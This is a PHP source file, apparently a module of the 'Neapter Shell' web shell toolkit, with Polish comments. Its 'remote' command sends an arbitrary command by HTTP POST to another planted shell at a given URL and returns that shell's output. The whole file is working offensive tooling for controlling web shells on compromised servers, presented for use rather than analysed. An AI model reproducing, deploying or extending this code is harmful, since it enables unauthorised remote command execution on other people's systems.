<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zdalne wywolanie shella
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleRemote extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('remote');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.00 2012-01-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Zdalne wywołanie shella

	Użycie
		remote adres polecenie

	Przykład
		remote http://localhost/shell.php :info
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Help
         */
        if ($this->oArgs->getNumberOfParams() < 2) {
            return self::getHelp();
        }

        /**
         * Rozszerzenie CURL jest wymagane
         */
        if (!extension_loaded('curl')) {
            return 'Brak rozszerzenie CURL';
        }

        $rCurl = curl_init();

        /**
         * Parametry
         */
        curl_setopt_array($rCurl, array
            (
                CURLOPT_URL => $this->oArgs->getParam(0),
                CURLOPT_USERAGENT => 'Neapter Shell Agent',
                CURLOPT_ENCODING => 'gzip, deflate',
                CURLOPT_POST => TRUE,
                CURLOPT_POSTFIELDS => array('cmd' => $this->oArgs->getParam(1)),
                CURLOPT_CONNECTTIMEOUT => 60,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_HTTPHEADER => array('X-Requested-With: XMLHttpRequest')
            )
        );

        /**
         * Polaczenie ze zdalnym shellem
         */
        $sData = curl_exec($rCurl);

        /**
         * Zamkniecie polaczenia
         */
        curl_close($rCurl);

        /**
         * Blad podczas polaczenia z shellem
         */
        if ($sData === FALSE) {
            return 'Nie można połączyć się ze zdalnym shellem';
        }

        return htmlspecialchars($sData);
    }

}
